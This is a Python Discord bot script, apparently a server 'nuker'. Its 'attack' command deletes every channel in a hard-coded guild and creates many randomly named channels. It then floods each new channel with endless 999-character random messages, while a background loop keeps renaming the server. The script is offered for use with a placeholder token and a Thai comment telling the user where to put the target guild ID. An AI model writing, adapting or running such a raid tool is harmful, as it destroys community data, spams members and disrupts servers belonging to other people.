import asyncio
import random
import string
import discord
from discord.ext import commands

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix="##",help_command=None,intents = intents)


##แก้Guildตรงนี้!!!
guild_ = 972718822048022578


@bot.event
async def on_ready():
    print('Bot started and ready to use')
@bot.command()
async def attack(ctx, arg2:int):
    arg1 = guild_
    sec1 = await delete(ctx=ctx,arg=arg1)
    if sec1:
        await create(ctx=ctx,arg1=arg1, arg2=arg2)
@bot.command()
async def create(ctx,arg1:int,arg2:int):
    for i in range(arg2):
        bot.loop.create_task(createchannel(arg1))
    return True
@bot.command()
async def delete(ctx,arg:int):
    guild = bot.get_guild(arg)
    for i in guild.channels:
        bot.loop.create_task(deletechannel(i.id))
    return True
##Process 
async def createchannel(arg1):
    guild = bot.get_guild(arg1)
    channel = await guild.create_text_channel(random_text(30))
    print('Create channel {0}'.format(channel))
    while True:
        await channel.send(random_text(999))
        
async def deletechannel(arg):
    channel = bot.get_channel(arg)
    print('Deleted {0}'.format(channel.id))
    await channel.delete()
async def auto_rename():
    await bot.wait_until_ready()
    while True:
        guild = bot.get_guild(guild_)
        await guild.edit(name=random_text(30))
def random_text(arg):
       return ''.join(random.choice(string.ascii_letters) for x in range(arg))
bot.loop.create_task(auto_rename())

bot.run('Your bot token here')